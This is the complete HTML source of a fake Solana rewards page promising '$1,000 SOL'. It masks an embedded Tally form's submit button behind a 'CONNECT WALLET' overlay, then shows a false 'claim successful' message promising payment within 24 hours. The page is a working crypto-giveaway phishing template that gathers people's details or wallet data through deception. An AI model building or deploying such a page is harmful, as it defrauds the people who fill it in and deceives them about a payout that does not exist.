<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOLANA ELITE REWARDS</title>
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
        
        body { margin: 0; background: #000; color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }

        .card { 
            width: 90%; 
            max-width: 440px; 
            background: #080808; 
            border: 1px solid rgba(0, 255, 163, 0.2); 
            border-radius: 40px; 
            padding: 50px 25px; 
            text-align: center; 
            box-shadow: 0 0 80px rgba(0, 0, 0, 1);
        }

        h1 { 
            font-family: 'Syncopate', sans-serif; 
            font-size: 1.5rem; 
            margin-bottom: 25px; 
            background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
            text-transform: uppercase;
        }

        .neon-label {
            color: var(--sol-g);
            font-family: 'Syncopate', sans-serif;
            font-size: 0.8rem;
            letter-spacing: 3px;
            display: block;
            margin-bottom: 10px;
            text-shadow: 0 0 10px rgba(0, 255, 163, 0.3);
        }

        /* TALLY BOX AREA */
        .tally-box-area {
            position: relative;
            width: 100%;
            min-height: 280px; /* Enough space for box + button */
            margin-top: 10px;
        }

        iframe {
            width: 100%;
            height: 350px;
            border: none !important;
        }

        /* THE BIG BUTTON OVERLAY */
        .btn-mask {
            position: absolute;
            bottom: 40px; /* Sits over the Tally submit */
            left: 5%;
            width: 90%;
            padding: 22px 0;
            background: linear-gradient(135deg, var(--sol-g), var(--sol-p));
            color: #fff;
            font-family: 'Syncopate', sans-serif;
            font-weight: 700;
            font-size: 0.8rem;
            border-radius: 15px;
            pointer-events: none; /* Let clicks hit the real button underneath */
            z-index: 10;
            box-shadow: 0 10px 30px rgba(0, 255, 163, 0.2);
        }

        /* SUCCESS VIEW */
        #success-view { display: none; }
        .success-h { color: var(--sol-g); font-family: 'Syncopate', sans-serif; font-size: 1.5rem; margin-bottom: 20px; }
        .congrats { padding: 30px; border: 1px dashed var(--sol-g); border-radius: 20px; background: rgba(0, 255, 163, 0.05); line-height: 1.6; font-size: 1.1rem; }
    </style>
</head>
<body>

    <div class="card">
        <!-- CLAIM SECTION -->
        <div id="form-view">
            <h1>CLAIM $1,000 SOL</h1>
            <span class="neon-label">SOLANA123</span>
            <span class="neon-label" style="font-size: 0.65rem; opacity: 0.7;">Connect wallet to receive rewards</span>

            <div class="tally-box-area">
                <div class="btn-mask">CONNECT WALLET</div>
                <!-- Tally Iframe: No extra masking, so the box shows clearly -->
                <iframe 
                    data-tally-src="https://tally.so" 
                    loading="lazy">
                </iframe>
            </div>
        </div>

        <!-- SUCCESS SECTION -->
        <div id="success-view">
            <h1 class="success-h">CLAIM SUCCESSFUL</h1>
            <div class="congrats">
                Congrats, you have claimed <b>$1,000 SOL</b> and you’ll receive the <b>$1,000 SOL</b> to your wallet address within 24 hrs.
            </div>
        </div>
    </div>

    <script async src="https://tally.so"></script>
    <script>
        window.onmessage = (e) => {
            if (e.data && e.data.includes('Tally.FormSubmitted')) {
                document.getElementById('form-view').style.display = 'none';
                document.getElementById('success-view').style.display = 'block';
            }
        };
    </script>
</body>
</html>
